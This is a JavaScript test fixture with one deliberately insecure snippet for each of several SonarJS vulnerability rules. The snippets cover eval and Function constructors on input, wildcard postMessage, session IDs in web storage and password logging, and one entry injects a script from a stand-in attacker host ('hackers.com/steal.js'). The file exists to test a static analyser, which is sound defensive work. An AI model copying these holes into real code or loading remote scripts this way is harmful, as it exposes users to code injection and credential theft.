/**
 * Test SonarJS vulnerability rules
 * https://www.sonarsource.com/products/codeanalyzers/sonarjs.html
 */
var SonarJS = {
  // Function constructors should not be used
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-3523
  'RSPEC-3523': function(data) {
    var obj = new Function('return ' + data)();
  },

  // Cross-document messaging domains should be carefully restricted
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-2819
  'RSPEC-2819': function(message) {
    var myWindow = document.getElementById('myIFrame').contentWindow;
    // Noncompliant; how do you know what you loaded in 'myIFrame' is still there?
    // "Authors should not use the wildcard keyword (*) in the targetOrigin
    // argument in messages that contain any confidential information, as
    // otherwise there is no way to guarantee that the message is only
    // delivered to the recipient to which it was intended."
    myWindow.postMessage(message, '*');
  },

  // Code should not be dynamically injected and executed
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-1523
  'RSPEC-1523': function(propName) {
    var value = eval('obj.' + propName);
    // Compliant solution: var value = obj[propName];
  },

  // Debugger statements should not be used
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-1525
  'RSPEC-1525': function() {
    var i;
    for (i = 1; i < 5; i++) {
      // Print i to the Output window.
      Debug.write('loop index is ' + i);
      // Wait for user to resume.
      debugger;
    }
  },

  // "alert(...)" should not be used
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-1442
  'RSPEC-1442': function() {
    alert('Unexpected Condition');
  },

  // Web SQL databases should not be used
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-2817
  'RSPEC-2817': function() {
    var db = window.openDatabase('myDb', '1.0', 'Personal secrets stored here', 2 * 1024 * 1024);
  },

  // Local storage should not be used
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-3271
  'RSPEC-3271': function(login, sessionId) {
    localStorage.setItem('login', login);
    sessionStorage.setItem('sessionId', sessionId);
  },

  // Untrusted content should not be included
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-2611
  'RSPEC-2611': function() {
    function include(url) {
      var s = document.createElement('script');
      s.setAttribute('type', 'text/javascript');
      s.setAttribute('src', url);
      document.body.appendChild(s);
    }
    include('http://hackers.com/steal.js')
  },

  // Console logging should not be used
  // https://rules.sonarsource.com/javascript/type/Vulnerability/RSPEC-2228
  'RSPEC-2228': function(password_entered) {
    console.log(password_entered);
  }
};
